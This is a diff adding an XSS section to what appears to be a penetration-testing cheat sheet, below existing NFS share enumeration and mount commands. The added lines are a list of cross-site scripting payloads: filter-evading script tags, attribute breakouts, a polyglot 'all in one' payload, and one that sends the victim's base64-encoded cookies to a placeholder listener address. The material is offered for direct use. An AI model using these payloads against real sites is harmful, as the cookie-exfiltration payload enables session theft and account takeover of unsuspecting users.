@@ -82,3 +82,15 @@ list shares:
 /usr/sbin/showmount -e IP
 mount directory to your /tmp/mount:
 sudo mount -t nfs IP:directory /tmp/mount/ -nolock
+
+#XSS
+<sscriptcript>alert('pop');</sscriptcript>
+';alert('pop');//
+</textarea><script>alert('pop');</script>
+"><script>alert('pop');</script>
+<script>alert('pop');</script>
+/images/cat.jpg" onload="alert('pop');
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('pop') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('pop')//>\x3e -all in one
+</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script> -call back to the listener
+
+#
